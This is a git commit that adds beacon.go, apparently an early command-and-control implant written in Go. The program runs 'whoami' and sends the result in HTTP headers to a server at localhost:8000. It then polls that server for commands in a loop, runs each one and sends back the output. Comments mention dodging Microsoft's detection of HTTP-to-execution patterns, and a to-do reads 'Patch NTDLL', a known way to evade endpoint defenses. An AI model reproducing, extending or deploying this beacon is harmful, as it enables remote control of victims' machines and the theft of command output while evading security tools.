3fb0b505c569b95ca3d5a76fda1ffe8ce33cf0d1
matt-culbert <culbertmatt@gmail.com>
2023-04-30 12:04:52 -0400

    Add files via upload

---
+++ beacon.go
@@ -0,0 +1,91 @@
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net/http"
+	"os/exec"
+	"strings"
+	"time"
+
+	"uuid"
+)
+
+func main() {
+	// to do
+	// generate random uuid of numbers/letters [all done]
+	// add a user agent with http.requests [all done]
+	// execute out from http request [all done]
+	// Patch NTDLL
+	uuidWithHyphen := uuid.New()
+	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
+	// Construct the client for requests, we define nothing right now but in the future can add functionality
+	client := http.Client{}
+	sb1 := "whoami"
+
+	cmd := exec.Command(sb1)
+	// Consider adding here logic to execute these commands under a new process or a child process to avoid crashing the main program if the command errors
+
+	result, _ := cmd.Output()
+	toSend := string(result)
+	toSend = strings.Replace(toSend, "\n", "", -1)
+	fmt.Printf(toSend)
+
+	//time.Sleep(10)
+	req, err := http.NewRequest("GET", "http://localhost:8000/schema", nil)
+	req.Header = http.Header{"APPSESSIONID": {uuid},"Res": {toSend},"User-Agent": {"testing testing"}}
+	resp, err := client.Do(req)
+
+	if err != nil {
+		panic(err)
+	}
+
+	defer resp.Body.Close()
+
+	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
+	for true {
+		// current issue is that we're not retrieving and executing the new ocmmand 
+		req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
+		req.Header.Add("APPSESSIONID", uuid)
+		resp, err = client.Do(req)
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		//Convert the body to type string
+		sb := string(body)
+		for sb == "0"{
+			time.Sleep(2 * time.Second)
+			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
+			req.Header.Add("APPSESSIONID", uuid)
+			resp, err = client.Do(req)
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				log.Fatalln(err)
+			}
+			sb = string(body)
+		}
+		fmt.Printf(sb)
+
+		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
+		sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
+		cmd := exec.Command(sb1)
+
+		result, _ := cmd.Output()
+		toSend := string(result)
+		toSend = strings.Replace(toSend, "\n", "", -1)
+		fmt.Printf(toSend)
+
+		time.Sleep(2 * time.Second)
+		req, err = http.NewRequest("GET", "http://localhost:8000/schema", nil)
+		req.Header = http.Header{"APPSESSIONID": {uuid},"Res": {toSend},"User-Agent": {"testing testing"}}
+		resp, err = client.Do(req)
+		if err != nil {
+			panic(err)
+		}
+		defer resp.Body.Close()
+	}
+
+}
